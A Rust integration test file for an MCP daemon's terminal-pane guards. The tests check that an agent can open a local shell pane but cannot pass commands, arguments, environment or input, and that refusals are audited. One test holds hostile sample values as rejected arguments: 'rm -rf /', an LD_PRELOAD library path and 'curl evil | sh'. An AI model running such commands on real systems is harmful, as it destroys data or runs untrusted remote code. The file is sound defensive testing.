//! Terminal pane 1b: what an agent can and cannot do with a terminal, over the
//! real MCP socket (PRD criteria 8 to 12).
//!
//! * C8  `nostromo.open_terminal` opens a local shell pane in the caller's own
//!   focus and takes nothing but an optional `working_directory`.
//! * C9  No tool in `tools/list` can write to, read from or close a terminal.
//! * C10 Any attempt to do so anyway (an unlisted tool name, a raw terminal
//!   frame on the MCP socket, a terminal verb on the IPC socket from a process
//!   that is not the verified app) is refused with a distinct error, audited
//!   with the calling focus, and changes nothing.
//! * C11 Agent layout and content calls that would remove, replace or overwrite
//!   a live terminal pane are refused; ratio-only changes are fine.
//! * C12 Only the user (a verified operator connection) closes a terminal.
//! * B1  Who may call `nostromo.open_terminal` at all: a plain agent session
//!   only. A network-driven session, the picks session and an agent the
//!   operator's tool policy denies it to are refused (-32001), audited without
//!   arguments, and start nothing; a Mother worker has no focus.
//! * S1  Agents have a lower quota than the user (`terminal_agent_quota_reached`).
//! * N3  A layout call cannot hide a terminal behind a tab or squeeze it out
//!   (`terminal_pane_hidden`, `terminal_pane_too_small`).
//!
//! The terminals here are real PTYs running the user's real login shell (the
//! password-database shell: `portable-pty` 0.8 overwrites `$SHELL` with it, so
//! there is no seam to substitute `/bin/cat`). An idle shell prints nothing, so
//! once it has answered a probe command "nothing reached the process" is
//! observable as "no bytes came back": anything typed into it would be echoed.
//! A verified-operator IPC connection is attached to the terminal and watches
//! those bytes. Nothing here assumes which shell it is: probes are
//! `printf 'RDY-%s\n' <n>` and the like.
//!
//! The process is found through `ps` (new children of this test binary); the
//! tests therefore run one at a time. `$HOME` is pointed at a private
//! directory so nothing reads or writes the real `~/.nostromo`; audit log,
//! store and sockets live in temp dirs.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, Once};
use std::time::{Duration, Instant};

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use nostromo::data::work::picks::PICKS_TAG;
use nostromo::ipc::codec::{read_frame, write_frame};
use nostromo::ipc::decisions::DecisionRegistry;
use nostromo::ipc::pane_registry::PaneRegistry;
use nostromo::ipc::peer_verify::testing::{app_info, script_info, FakePeerVerifier};
use nostromo::ipc::peer_verify::PeerInfo;
use nostromo::ipc::protocol::{
    ClientMsg, FocusMeta, PaneTree, ServerMsg, TerminalInfo, TerminalStatus, Topic,
    PROTOCOL_VERSION,
};
use nostromo::ipc::server::Server;
use nostromo::ipc::SessionManager;
use nostromo::mcp::server::{TERMINAL_FORBIDDEN_CODE, TOOL_FORBIDDEN_CODE};
use nostromo::mcp::tools::terminal::classify_terminal_attempt;
use nostromo::mcp::{DaemonMcpBackend, McpServer, McpSharedState, PerriDaemonState};
use nostromo::terminal::audit::AuditLog;
use nostromo::terminal::store::TerminalStore;
use nostromo::terminal::{TerminalAgentApi, TerminalConfig, TerminalManager};
use serde_json::{json, Value};
use tempfile::TempDir;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::UnixStream;
use tokio::sync::broadcast;

/// The focus the agent under test runs in.
const TAG: &str = "cody-term-it";
const WAIT: Duration = Duration::from_secs(10);
/// How long "nothing happened" is watched after a refused attempt.
const QUIET: Duration = Duration::from_millis(500);

// ── process environment ──────────────────────────────────────────────────────

fn home_path() -> PathBuf {
    Path::new(env!("CARGO_TARGET_TMPDIR"))
        .join(format!("terminal-guards-home-{}", std::process::id()))
}

/// Once per test process, before any terminal opens: a private `$HOME` (so
/// `~/.nostromo` is never touched and "the default working directory" is a
/// known place), and a stand-in `claude` binary so a focus can have a session
/// (and so a session working directory).
fn init_process_env() {
    static ONCE: Once = Once::new();
    ONCE.call_once(|| {
        let home = home_path();
        std::fs::create_dir_all(home.join(".nostromo")).expect("create the private $HOME");
        std::env::set_var("HOME", &home);
        std::env::set_var("NOSTROMO_CLAUDE_BIN", "/bin/sh");
    });
}

/// Tests find "their" shell among this process's children, so they take turns.
static SERIAL: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

async fn serial() -> tokio::sync::MutexGuard<'static, ()> {
    SERIAL.lock().await
}

fn canon(p: &Path) -> PathBuf {
    std::fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf())
}

// ── finding the shell process ────────────────────────────────────────────────

struct Proc {
    pid: u32,
    stat: String,
    comm: String,
}

fn my_children() -> Vec<Proc> {
    let out = std::process::Command::new("ps")
        .args(["-A", "-o", "pid=,ppid=,stat=,comm="])
        .output()
        .expect("`ps` must be available to find the shell process");
    let me = std::process::id();
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|line| {
            let mut f = line.split_whitespace();
            let pid: u32 = f.next()?.parse().ok()?;
            let ppid: u32 = f.next()?.parse().ok()?;
            let stat = f.next()?.to_string();
            let comm = f.collect::<Vec<_>>().join(" ");
            let comm = comm.rsplit('/').next().unwrap_or("").to_string();
            (ppid == me).then_some(Proc { pid, stat, comm })
        })
        .collect()
}

fn children() -> Vec<Proc> {
    // The `ps` that is looking is itself a child.
    my_children()
        .into_iter()
        .filter(|p| p.comm != "ps")
        .collect()
}

fn child_pids() -> BTreeSet<u32> {
    children()
        .into_iter()
        .filter(|p| !p.stat.starts_with('Z'))
        .map(|p| p.pid)
        .collect()
}

fn is_alive(pid: u32) -> bool {
    children()
        .iter()
        .any(|p| p.pid == pid && !p.stat.starts_with('Z'))
}

/// Child processes that were not running at `before`.
fn new_children(before: &BTreeSet<u32>) -> Vec<u32> {
    child_pids().difference(before).copied().collect()
}

/// The one new child (the shell) since `before` (waits for it to show up).
async fn the_new_shell(before: &BTreeSet<u32>) -> u32 {
    let deadline = Instant::now() + WAIT;
    loop {
        let found = new_children(before);
        if let [pid] = found.as_slice() {
            return *pid;
        }
        assert!(
            found.len() <= 1,
            "more than one new process appeared: {found:?}"
        );
        assert!(
            Instant::now() < deadline,
            "no new shell process appeared; children of this process: {:?}",
            my_children()
                .iter()
                .map(|p| format!("{} {} {}", p.pid, p.stat, p.comm))
                .collect::<Vec<_>>()
        );
        tokio::time::sleep(Duration::from_millis(25)).await;
    }
}

async fn eventually(what: &str, mut cond: impl FnMut() -> bool) {
    let deadline = Instant::now() + WAIT;
    while !cond() {
        assert!(Instant::now() < deadline, "timed out waiting for {what}");
        tokio::time::sleep(Duration::from_millis(25)).await;
    }
}

// ── the MCP client ───────────────────────────────────────────────────────────

struct Mcp {
    reader: BufReader<tokio::net::unix::OwnedReadHalf>,
    writer: tokio::net::unix::OwnedWriteHalf,
    next_id: i64,
}

impl Mcp {
    /// Send `hello` as the identifying first frame, then `initialize`.
    async fn connect(socket: &Path, hello: Value) -> Mcp {
        let stream = UnixStream::connect(socket).await.expect("mcp connect");
        let (r, w) = stream.into_split();
        let mut mcp = Mcp {
            reader: BufReader::new(r),
            writer: w,
            next_id: 100,
        };
        mcp.send(&hello).await;
        let init = mcp
            .rpc(
                "initialize",
                json!({"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"t","version":"0"}}),
            )
            .await;
        assert!(init.get("error").is_none(), "initialize failed: {init}");
        mcp
    }

    async fn send(&mut self, v: &Value) {
        let mut bytes = serde_json::to_vec(v).unwrap();
        bytes.push(b'\n');
        self.writer.write_all(&bytes).await.expect("mcp write");
    }

    async fn recv(&mut self) -> Value {
        let mut line = String::new();
        let n = tokio::time::timeout(WAIT, self.reader.read_line(&mut line))
            .await
            .expect("timed out waiting for an MCP response")
            .expect("mcp read");
        assert!(n > 0, "the MCP connection was closed");
        serde_json::from_str(line.trim()).expect("response should be JSON")
    }

    async fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.next_id += 1;
        let id = self.next_id;
        self.send(&json!({"jsonrpc":"2.0","id":id,"method":method,"params":params}))
            .await;
        let resp = self.recv().await;
        assert_eq!(
            resp["id"],
            json!(id),
            "response to a different request: {resp}"
        );
        resp
    }

    /// `tools/call`, the whole JSON-RPC response.
    async fn call_raw(&mut self, name: &str, args: Value) -> Value {
        self.rpc("tools/call", json!({"name": name, "arguments": args}))
            .await
    }

    /// `tools/call` that must not be a JSON-RPC error; the tool's JSON result.
    async fn call(&mut self, name: &str, args: Value) -> Value {
        let resp = self.call_raw(name, args).await;
        assert!(
            resp.get("error").is_none(),
            "{name} returned a JSON-RPC error: {resp}"
        );
        let text = resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap_or_else(|| panic!("{name}: no text content in {resp}"));
        serde_json::from_str(text).expect("tool content should be JSON")
    }

    async fn list_tools(&mut self) -> Vec<Value> {
        let resp = self.rpc("tools/list", json!({})).await;
        resp["result"]["tools"]
            .as_array()
            .unwrap_or_else(|| panic!("no tools in {resp}"))
            .clone()
    }
}

// ── the IPC client (the user's app, or an impostor) ──────────────────────────

struct Ipc {
    writer: tokio::io::WriteHalf<UnixStream>,
    log: Arc<Mutex<Vec<ServerMsg>>>,
    reader: tokio::task::JoinHandle<()>,
    nonce: Option<String>,
}

impl Drop for Ipc {
    fn drop(&mut self) {
        self.reader.abort();
    }
}

impl Ipc {
    /// Hello (claiming `claim`) -> Welcome -> Subscribe -> synced.
    async fn connect(socket: &Path, claim: Option<&str>, topics: Vec<Topic>) -> Ipc {
        let stream = UnixStream::connect(socket).await.expect("ipc connect");
        let (mut read_half, writer) = tokio::io::split(stream);
        let log = Arc::new(Mutex::new(Vec::new()));
        let log_for_reader = Arc::clone(&log);
        let reader = tokio::spawn(async move {
            while let Ok(bytes) = read_frame(&mut read_half).await {
                if let Ok(msg) = serde_json::from_slice::<ServerMsg>(&bytes) {
                    log_for_reader.lock().unwrap().push(msg);
                }
            }
        });
        let mut ipc = Ipc {
            writer,
            log,
            reader,
            nonce: None,
        };
        ipc.send(&ClientMsg::Hello {
            client_id: "mcp-terminal-guards".into(),
            protocol_version: PROTOCOL_VERSION,
            client_kind: claim.map(str::to_string),
        })
        .await;
        let welcome = ipc
            .wait_for(0, "a Welcome", |m| matches!(m, ServerMsg::Welcome { .. }))
            .await;
        if let ServerMsg::Welcome { operator_nonce, .. } = welcome {
            ipc.nonce = operator_nonce;
        }
        let nonce = ipc.nonce.clone();
        ipc.send(&ClientMsg::Subscribe {
            topics,
            renders_decisions: false,
            renders_approvals: false,
            capabilities: vec!["terminal_ui".to_string()],
            operator_nonce: nonce,
        })
        .await;
        ipc.sync().await;
        ipc
    }

    async fn send(&mut self, msg: &ClientMsg) {
        write_frame(&mut self.writer, &serde_json::to_vec(msg).unwrap())
            .await
            .expect("ipc write");
    }

    fn mark(&self) -> usize {
        self.log.lock().unwrap().len()
    }

    /// The first frame at or after log index `from` that `pred` accepts.
    async fn wait_for(
        &self,
        from: usize,
        what: &str,
        pred: impl Fn(&ServerMsg) -> bool,
    ) -> ServerMsg {
        let deadline = Instant::now() + WAIT;
        loop {
            if let Some(found) = self.log.lock().unwrap()[from..].iter().find(|m| pred(m)) {
                return found.clone();
            }
            assert!(Instant::now() < deadline, "timed out waiting for {what}");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }

    async fn sync(&mut self) {
        let from = self.mark();
        self.send(&ClientMsg::Ping).await;
        self.wait_for(from, "a Pong", |m| matches!(m, ServerMsg::Pong))
            .await;
    }

    /// The terminal bytes (replay and output) received for `terminal_id` since `from`.
    fn bytes_since(&self, from: usize, terminal_id: &str) -> Vec<u8> {
        let mut out = Vec::new();
        for m in &self.log.lock().unwrap()[from..] {
            match m {
                ServerMsg::TerminalReplay {
                    terminal_id: id,
                    bytes,
                    ..
                }
                | ServerMsg::TerminalOutput {
                    terminal_id: id,
                    bytes,
                } if id == terminal_id => out.extend(B64.decode(bytes).expect("base64")),
                _ => {}
            }
        }
        out
    }

    async fn attach(&mut self, terminal_id: &str) {
        let from = self.mark();
        self.send(&ClientMsg::TerminalAttach {
            terminal_id: terminal_id.into(),
        })
        .await;
        self.wait_for(
            from,
            "the replay",
            |m| matches!(m, ServerMsg::TerminalReplay { terminal_id: id, .. } if id == terminal_id),
        )
        .await;
    }

    async fn input(&mut self, terminal_id: &str, bytes: &[u8]) {
        self.send(&ClientMsg::TerminalInput {
            terminal_id: terminal_id.into(),
            bytes: B64.encode(bytes),
        })
        .await;
    }

    /// Type `command` (and Return) into the terminal.
    async fn type_line(&mut self, terminal_id: &str, command: &str) {
        self.input(terminal_id, format!("{command}\r").as_bytes())
            .await;
    }

    /// Run `command; printf 'DONE-%s\n' <n>` and return what the terminal
    /// printed from that moment to the marker. The echoed command line never
    /// contains the marker (`%s` stands in for it there), so its first
    /// appearance is the shell's own output.
    async fn run(&mut self, terminal_id: &str, command: &str) -> String {
        static MARKERS: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(1);
        let n = MARKERS.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let marker = format!("DONE-{n:06}");
        let from = self.mark();
        self.type_line(
            terminal_id,
            &format!("{command}; printf 'DONE-%s\\n' {n:06}"),
        )
        .await;
        let deadline = Instant::now() + WAIT;
        loop {
            let seen = String::from_utf8_lossy(&self.bytes_since(from, terminal_id)).into_owned();
            if let Some(at) = seen.find(&marker) {
                return seen[..at].to_string();
            }
            assert!(
                Instant::now() < deadline,
                "the shell did not answer `{command}`; saw {seen:?}"
            );
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }

    /// The shell may still be starting (rc files): ask until it answers one,
    /// then let its prompt settle, so that what follows is quiet.
    async fn shell_ready(&mut self, terminal_id: &str) {
        let deadline = Instant::now() + WAIT;
        loop {
            let from = self.mark();
            self.type_line(terminal_id, "printf 'RDY-%s\\n' 1").await;
            let step = Instant::now() + Duration::from_secs(3);
            while Instant::now() < step {
                if String::from_utf8_lossy(&self.bytes_since(from, terminal_id)).contains("RDY-1") {
                    tokio::time::sleep(Duration::from_millis(400)).await;
                    return;
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            assert!(Instant::now() < deadline, "the shell never answered");
        }
    }
}

// ── the daemon under test ────────────────────────────────────────────────────

#[derive(Clone, Copy)]
enum Peer {
    /// The genuine, pinned Mac app (still needs the `mac_app` claim).
    App,
    /// An ordinary local process (an agent's own script).
    Script,
}

fn peer_verifier(peers: &[Peer]) -> FakePeerVerifier {
    let script: Vec<Option<PeerInfo>> = peers
        .iter()
        .map(|p| {
            Some(match p {
                Peer::App => app_info(),
                Peer::Script => script_info(),
            })
        })
        .collect();
    FakePeerVerifier::scripted(script, Some(script_info()))
}

struct Env {
    _tmp: TempDir,
    _server: Server,
    _mcp: McpServer,
    panes: Arc<Mutex<PaneRegistry>>,
    terminals: Arc<Mutex<TerminalManager>>,
    session_mgr: Arc<Mutex<SessionManager>>,
    bcast: broadcast::Sender<ServerMsg>,
    mcp_sock: PathBuf,
    ipc_sock: PathBuf,
    audit_path: PathBuf,
}

impl Drop for Env {
    /// No test may leave a shell behind.
    fn drop(&mut self) {
        self.terminals
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .shutdown();
    }
}

impl Env {
    /// `peers` is who the n-th IPC connection is, in connect order.
    async fn start(peers: &[Peer]) -> Env {
        init_process_env();
        let tmp = TempDir::new().expect("tempdir");
        let panes = Arc::new(Mutex::new(PaneRegistry::in_memory()));
        let audit_path = tmp.path().join("audit").join("terminal.jsonl");
        let terminals = TerminalManager::new(TerminalConfig {
            audit: AuditLog::open(&audit_path).expect("open the audit log"),
            store: TerminalStore::in_memory(),
            pane_registry: Some(Arc::clone(&panes)),
        });
        let session_mgr = Arc::new(Mutex::new(SessionManager::with_store_path(
            tmp.path().join("sessions.json"),
        )));
        let decisions = Arc::new(Mutex::new(DecisionRegistry::new()));
        let ipc_sock = tmp.path().join("nostromod.sock");
        let server = Server::bind(
            &ipc_sock,
            Arc::clone(&session_mgr),
            tmp.path().join("perri-state"),
            Arc::clone(&decisions),
            Arc::new(peer_verifier(peers)),
            false,
            Arc::clone(&terminals),
        )
        .expect("bind the daemon socket");
        decisions
            .lock()
            .unwrap()
            .configure_broadcast(server.tx.clone());
        let bcast = server.tx.clone();

        let backend = DaemonMcpBackend {
            pane_registry: Arc::clone(&panes),
            session_mgr: Arc::clone(&session_mgr),
            broadcast_tx: bcast.clone(),
            perri: PerriDaemonState::default(),
            decisions,
            tickets: Default::default(),
            tracker: Default::default(),
            terminals: TerminalAgentApi::new(Arc::clone(&terminals)),
        };
        let mcp_sock = tmp.path().join("mcp.sock");
        let mcp = McpServer::bind(mcp_sock.clone(), McpSharedState::for_daemon(backend))
            .await
            .expect("bind the MCP socket");

        Env {
            _tmp: tmp,
            _server: server,
            _mcp: mcp,
            panes,
            terminals,
            session_mgr,
            bcast,
            mcp_sock,
            ipc_sock,
            audit_path,
        }
    }

    /// The focus has a pane tree (a bare `repl`).
    fn init_focus(&self, tag: &str) {
        self.panes.lock().unwrap().get_or_init(tag);
    }

    /// An agent connection whose Hello names `tag` (none: an unidentified caller).
    async fn mcp(&self, tag: Option<&str>) -> Mcp {
        let hello = match tag {
            Some(t) => json!({"type":"hello","pty_id": t}),
            None => json!({"type":"hello"}),
        };
        Mcp::connect(&self.mcp_sock, hello).await
    }

    async fn app(&self, topics: Vec<Topic>) -> Ipc {
        let ipc = Ipc::connect(&self.ipc_sock, Some("mac_app"), topics).await;
        assert!(
            ipc.nonce.is_some(),
            "the verified app's Welcome must carry an operator_nonce (is the Peer list right?)"
        );
        ipc
    }

    fn tree(&self, tag: &str) -> Option<PaneTree> {
        self.panes.lock().unwrap().get(tag).cloned()
    }

    fn pane_ids(&self, tag: &str) -> Vec<String> {
        self.panes.lock().unwrap().pane_ids(tag)
    }

    fn terminal_leaves(&self, tag: &str) -> Vec<String> {
        self.panes.lock().unwrap().terminal_leaves(tag)
    }

    fn all_terminals(&self) -> Vec<TerminalInfo> {
        self.terminals.lock().unwrap().list()
    }

    fn info(&self, terminal_id: &str) -> Option<TerminalInfo> {
        self.terminals.lock().unwrap().info(terminal_id)
    }

    fn audit(&self) -> Vec<Value> {
        std::fs::read_to_string(&self.audit_path)
            .unwrap_or_default()
            .lines()
            .filter_map(|l| serde_json::from_str(l).ok())
            .collect()
    }

    /// The first audit line `pred` accepts (waits for it).
    async fn audit_line(&self, what: &str, pred: impl Fn(&Value) -> bool) -> Value {
        let deadline = Instant::now() + WAIT;
        loop {
            if let Some(line) = self.audit().into_iter().find(|l| pred(l)) {
                return line;
            }
            assert!(
                Instant::now() < deadline,
                "no audit line for {what}; audit so far: {:#?}",
                self.audit()
            );
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    }

    /// An MCP-channel `refused` audit line naming this focus and tool.
    async fn refusal(&self, op: &str, tool: &str, code: &str) -> Value {
        let line = self
            .audit_line(&format!("a refused {op} via {tool}"), |l| {
                l["event"] == "refused" && l["channel"] == "mcp" && l["tool"] == tool
            })
            .await;
        assert_eq!(line["op"], op, "{line}");
        assert_eq!(line["code"], code, "{line}");
        assert_eq!(
            line["focus"], TAG,
            "the refusal must name the calling focus: {line}"
        );
        line
    }

    fn opened_lines(&self) -> Vec<Value> {
        self.audit()
            .into_iter()
            .filter(|l| l["event"] == "opened")
            .collect()
    }
}

/// Everything broadcast so far.
fn drain(rx: &mut broadcast::Receiver<ServerMsg>) -> Vec<ServerMsg> {
    let mut out = Vec::new();
    loop {
        match rx.try_recv() {
            Ok(m) => out.push(m),
            Err(broadcast::error::TryRecvError::Lagged(_)) => continue,
            Err(_) => return out,
        }
    }
}

fn is_decision_request(m: &ServerMsg) -> bool {
    matches!(m, ServerMsg::DecisionRequest { .. })
}

// ── a live terminal in the agent's focus ─────────────────────────────────────

struct Live {
    env: Env,
    mcp: Mcp,
    app: Ipc,
    rx: broadcast::Receiver<ServerMsg>,
    info: TerminalInfo,
    pid: u32,
    _work: TempDir,
}

impl Live {
    /// A focus with a pane tree and one live terminal the agent opened through
    /// `nostromo.open_terminal`, with a verified-operator connection attached.
    async fn start() -> Live {
        let env = Env::start(&[Peer::App, Peer::Script]).await;
        env.init_focus(TAG);
        let mut app = env.app(vec![Topic::Terminal, Topic::Layout]).await;
        let mut mcp = env.mcp(Some(TAG)).await;
        let work = TempDir::new().expect("tempdir");

        let before = child_pids();
        let res = mcp
            .call(
                "nostromo.open_terminal",
                json!({"working_directory": work.path().to_string_lossy()}),
            )
            .await;
        assert_eq!(res["ok"], true, "open_terminal failed: {res}");
        let terminal_id = res["terminal_id"]
            .as_str()
            .expect("terminal_id")
            .to_string();
        let info = env
            .info(&terminal_id)
            .expect("the manager knows the terminal");
        let pid = the_new_shell(&before).await;
        app.attach(&terminal_id).await;
        app.shell_ready(&terminal_id).await;
        let rx = env.bcast.subscribe();
        Live {
            env,
            mcp,
            app,
            rx,
            info,
            pid,
            _work: work,
        }
    }

    fn id(&self) -> &str {
        &self.info.terminal_id
    }

    fn pane(&self) -> &str {
        &self.info.pane_id
    }

    /// After a refused attempt: wait [`QUIET`], then nothing reached the
    /// process (no bytes came back), it is the same process and still alive,
    /// still `running`, and its leaf is still registered and in the tree.
    async fn assert_unchanged(&mut self, since: usize, what: &str) {
        tokio::time::sleep(QUIET).await;
        assert_eq!(
            self.app.bytes_since(since, self.id()),
            Vec::<u8>::new(),
            "{what}: the terminal produced output after a refused attempt"
        );
        assert!(is_alive(self.pid), "{what}: the shell process is gone");
        let info = self
            .env
            .info(self.id())
            .unwrap_or_else(|| panic!("{what}: the terminal is gone from the manager"));
        assert_eq!(info.status, TerminalStatus::Running, "{what}");
        assert_eq!(info.pane_id, self.pane(), "{what}");
        assert_eq!(self.env.all_terminals().len(), 1, "{what}");
        assert_eq!(
            self.env.terminal_leaves(TAG),
            vec![self.pane().to_string()],
            "{what}: the leaf is no longer registered"
        );
        assert!(
            self.env.pane_ids(TAG).iter().any(|p| p == self.pane()),
            "{what}: the leaf is gone from the focus's tree"
        );
    }

    /// The shell still answers the user (and, because it does, a stray byte
    /// from a refused attempt would have shown up earlier in the same stream).
    async fn prove_responsive(&mut self) {
        let id = self.id().to_string();
        let out = self.app.run(&id, "printf 'ALIVE-%s\\n' 7").await;
        assert!(
            out.contains("ALIVE-7"),
            "the shell stopped answering: {out:?}"
        );
        tokio::time::sleep(Duration::from_millis(300)).await;
    }

    /// A layout/content call the registry or tool must refuse as protecting
    /// the terminal; checks the error, the audit line and that nothing changed.
    async fn assert_protected(&mut self, tool: &str, args: Value, op: &str) {
        let tree_before = self.env.tree(TAG);
        drain(&mut self.rx);
        let since = self.app.mark();
        let res = self.mcp.call(tool, args).await;
        assert_eq!(res["error"], "terminal_pane_protected", "{tool}: {res}");
        self.env.refusal(op, tool, "terminal_pane_protected").await;
        assert_eq!(self.env.tree(TAG), tree_before, "{tool}: the tree changed");
        let after = drain(&mut self.rx);
        assert!(
            !after.iter().any(|m| matches!(
                m,
                ServerMsg::FocusLayout { tag, .. } if tag == TAG
            ) || matches!(
                m,
                ServerMsg::PaneContent { pane_id, .. } if pane_id == self.pane()
            )),
            "{tool}: a refused call must not broadcast a layout or the terminal pane's content: {after:?}"
        );
        self.assert_unchanged(since, tool).await;
    }
}

fn ratio_of(tree: &PaneTree, pane: &str) -> Option<f32> {
    match tree {
        PaneTree::Leaf { .. } => None,
        PaneTree::Split {
            children, ratios, ..
        } => {
            for (child, ratio) in children.iter().zip(ratios) {
                if matches!(child, PaneTree::Leaf { pane_id } if pane_id == pane) {
                    return Some(*ratio);
                }
            }
            children.iter().find_map(|c| ratio_of(c, pane))
        }
        PaneTree::Tabs { children, .. } => children.iter().find_map(|c| ratio_of(c, pane)),
    }
}

fn home() -> String {
    home_path().to_string_lossy().into_owned()
}

/// Where the terminal's shell really is: attach as the user and ask it.
async fn shell_cwd(env: &Env, terminal_id: &str) -> PathBuf {
    let mut app = env.app(vec![Topic::Terminal]).await;
    app.attach(terminal_id).await;
    app.shell_ready(terminal_id).await;
    let out = app
        .run(terminal_id, "printf 'CWD=%s\\n' \"$(pwd -P)\"")
        .await;
    out.split(['\r', '\n'])
        .find_map(|l| l.trim().strip_prefix("CWD=").filter(|p| p.starts_with('/')))
        .map(PathBuf::from)
        .unwrap_or_else(|| panic!("the shell did not report its directory: {out:?}"))
}

// ═════════════════════════════════════════════════════════════════════════════
// C8: an agent can request a local terminal pane in its own focus
// ═════════════════════════════════════════════════════════════════════════════

#[tokio::test]
async fn open_terminal_adds_a_terminal_pane_to_the_callers_focus_running_the_shell_in_home_when_the_focus_has_no_session(
) {
    let _turn = serial().await;
    let env = Env::start(&[Peer::App]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;
    let before = child_pids();

    let res = mcp.call("nostromo.open_terminal", json!({})).await;

    assert_eq!(res["ok"], true, "{res}");
    let terminal_id = res["terminal_id"].as_str().expect("terminal_id");
    let pane_id = res["pane_id"].as_str().expect("pane_id");
    assert!(pane_id.starts_with("terminal-"), "{pane_id}");

    // The pane is a registered terminal leaf of the caller's focus tree.
    assert_eq!(env.terminal_leaves(TAG), vec![pane_id.to_string()]);
    let ids = env.pane_ids(TAG);
    assert!(ids.iter().any(|p| p == pane_id), "{ids:?}");
    assert!(ids.iter().any(|p| p == "repl"), "{ids:?}");

    // The daemon owns a running local terminal for it.
    let info = env.info(terminal_id).expect("a terminal in the manager");
    assert_eq!(info.tag, TAG);
    assert_eq!(info.pane_id, pane_id);
    assert_eq!(info.status, TerminalStatus::Running);
    assert_eq!(info.requested_by.kind, "focus");
    assert_eq!(info.cwd.as_deref(), Some(home().as_str()));

    // A real shell process started, in $HOME.
    let pid = the_new_shell(&before).await;
    assert!(is_alive(pid));
    assert_eq!(
        canon(&shell_cwd(&env, terminal_id).await),
        canon(&home_path()),
        "the shell must start in $HOME when the focus has no session"
    );
}

#[tokio::test]
async fn open_terminal_starts_the_shell_in_the_focus_sessions_working_directory() {
    let _turn = serial().await;
    let env = Env::start(&[Peer::App]).await;
    env.init_focus(TAG);
    let work = TempDir::new().expect("tempdir");
    // A focus session whose working directory is `work` (a stand-in `claude`).
    env.session_mgr
        .lock()
        .unwrap()
        .spawn_session(
            TAG.to_string(),
            "cody".to_string(),
            "Cody".to_string(),
            Some(work.path().to_path_buf()),
            None,
            false,
        )
        .expect("the stand-in session starts");
    assert_eq!(
        env.session_mgr.lock().unwrap().cwd_for(TAG),
        Some(work.path().to_path_buf()),
        "harness: the focus must have a session working directory"
    );
    let mut mcp = env.mcp(Some(TAG)).await;
    let before = child_pids();

    let res = mcp.call("nostromo.open_terminal", json!({})).await;

    assert_eq!(res["ok"], true, "{res}");
    let terminal_id = res["terminal_id"].as_str().expect("terminal_id");
    let info = env.info(terminal_id).expect("terminal");
    assert_eq!(
        info.cwd.as_deref().map(|c| canon(Path::new(c))),
        Some(canon(work.path())),
        "default working directory is the focus session's"
    );
    let pid = the_new_shell(&before).await;
    assert!(is_alive(pid));
    assert_eq!(
        canon(&shell_cwd(&env, terminal_id).await),
        canon(work.path())
    );
}

#[tokio::test]
async fn open_terminal_with_a_working_directory_starts_the_shell_there() {
    let _turn = serial().await;
    let env = Env::start(&[Peer::App]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;
    let before = child_pids();

    let res = mcp
        .call(
            "nostromo.open_terminal",
            json!({"working_directory": "/tmp"}),
        )
        .await;

    assert_eq!(res["ok"], true, "{res}");
    let terminal_id = res["terminal_id"].as_str().expect("terminal_id");
    let info = env.info(terminal_id).expect("terminal");
    assert_eq!(info.cwd.as_deref(), Some("/tmp"));
    let pid = the_new_shell(&before).await;
    assert!(is_alive(pid));
    assert_eq!(
        canon(&shell_cwd(&env, terminal_id).await),
        canon(Path::new("/tmp"))
    );
}

#[tokio::test]
async fn open_terminal_refuses_a_relative_missing_or_non_directory_working_directory_and_opens_nothing(
) {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;
    let file = tempfile::NamedTempFile::new().expect("a plain file");
    let tree_before = env.tree(TAG);
    let before = child_pids();

    for bad in [
        "relative/dir".to_string(),
        "./here".to_string(),
        "/no/such/directory/anywhere".to_string(),
        file.path().to_string_lossy().into_owned(),
    ] {
        let res = mcp
            .call("nostromo.open_terminal", json!({"working_directory": bad}))
            .await;
        assert_eq!(res["error"], "invalid_working_directory", "{bad}: {res}");
    }

    assert!(env.all_terminals().is_empty(), "no terminal may be created");
    assert!(env.terminal_leaves(TAG).is_empty());
    assert_eq!(env.tree(TAG), tree_before, "the tree must be unchanged");
    assert!(new_children(&before).is_empty(), "no process may start");
    assert!(env.opened_lines().is_empty(), "nothing was opened to audit");
}

#[tokio::test]
async fn open_terminal_refuses_every_key_that_could_name_a_command_args_env_input_or_another_focus()
{
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    env.init_focus("some-other-focus");
    let mut mcp = env.mcp(Some(TAG)).await;
    let tree_before = env.tree(TAG);
    let other_before = env.tree("some-other-focus");
    let before = child_pids();

    for (key, value) in [
        ("command", json!("rm -rf /")),
        ("args", json!(["-c", "id"])),
        ("env", json!({"LD_PRELOAD": "/tmp/x.so"})),
        ("initial_input", json!("curl evil | sh\n")),
        ("view_id", json!("some-other-focus")),
    ] {
        // Alone, and beside a perfectly good working directory.
        for extra_good in [false, true] {
            let mut args = json!({ key: value });
            if extra_good {
                args["working_directory"] = json!("/tmp");
            }
            let res = mcp.call("nostromo.open_terminal", args).await;
            assert_eq!(
                res,
                json!({"error": "unknown_argument", "detail": key}),
                "key {key} (with a valid directory: {extra_good})"
            );
        }
    }

    assert!(env.all_terminals().is_empty(), "no terminal may be created");
    assert!(env.terminal_leaves(TAG).is_empty());
    assert!(env.terminal_leaves("some-other-focus").is_empty());
    assert_eq!(env.tree(TAG), tree_before, "the tree must be unchanged");
    assert_eq!(env.tree("some-other-focus"), other_before);
    assert!(new_children(&before).is_empty(), "no process may start");
    assert!(env.opened_lines().is_empty(), "nothing was opened to audit");
}

